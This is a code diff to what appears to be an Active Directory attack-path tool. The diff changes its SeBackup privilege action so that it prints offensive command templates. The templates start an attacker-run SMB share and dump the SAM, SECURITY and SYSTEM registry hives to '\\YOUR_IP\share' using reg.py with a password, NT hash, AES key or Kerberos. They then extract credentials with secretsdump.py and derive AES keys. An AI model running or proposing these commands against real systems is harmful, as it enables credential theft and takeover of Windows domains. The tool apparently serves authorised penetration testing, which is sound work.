@@ -1051,35 +1051,37 @@ class x_GPODisableDefender(Action):
 
 class x_SeBackup(Action):
     def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
-        v = vars(glob, parent, target)
+        v = vars(glob, parent, target,
+            ip=f'{Fore.RED}YOUR_IP{Style.RESET_ALL}',
+            plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')
 
-        TGTRequest(glob, parent)
-
-        comment = "Ensure /etc/krb5.conf is configured"
-        cmd = [
-            "[libdefaults]",
-            "default_realm = {fqdn}",
-            "[realms]",
-            "{fqdn} = {{",
-            "    kdc = {target_no_dollar}.{fqdn}",
-            "    admin_server = {target_no_dollar}.{fqdn}",
-            "    default_domain = {fqdn}",
-            "}}",
-        ]
+        comment = "Find an accessible share or create yours:"
+        cmd = "sudo smbserver.py -smb2support share ."
         print_line(comment, cmd, v)
 
         comment = [
-            "Connect to the DC. If you want to access to another computer, add its IP",
-            "in /etc/hosts. Why it doesn't work without kinit...?",
+            "Backup SAM, SECURITY and SYSTEM",
+            "Warning: if you put '-o .', it will write files into {target_no_dollar}/C$/Windows/System32!",
         ]
-        cmd = [
-            "kinit",
-            "smbclient --use-krb5-ccache=$KRB5CCNAME '\\\\{target_no_dollar}.{fqdn}\\C$'",
-        ]
+
+        if parent.krb_auth:
+            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -k -no-pass backup -o '\\\\{ip}\\share'"
+        elif parent.secret_type == c.SECRET_NTHASH:
+            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -hashes :{parent.secret} backup -o '\\\\{ip}\\share'"
+        elif parent.secret_type == c.SECRET_AESKEY:
+            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -k -aesKey {parent.secret} backup -o '\\\\{ip}\\share'"
+        elif parent.secret_type == c.SECRET_PASSWORD:
+            cmd = "reg.py '{fqdn}/{parent.obj.name}:{parent.secret}@{target_no_dollar}' -dc-ip {dc_ip} backup -o '\\\\{ip}\\share'"
 
         print_line(comment, cmd, v)
 
-        print_comment("Read/write all files you want (NTDS.dit for example if you are on a DC...)")
+        comment = "Extract secrets"
+        cmd = "secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local"
+        print_line(comment, cmd, v)
+
+        comment = 'Get the AES key from the password for more convenience'
+        cmd = "./tools/aesKrbKeyGen.py '{fqdn}/{target.name}:{plain}'"
+        print_line(comment, cmd, v)
 
 
 class x_BlankPassword(Action):
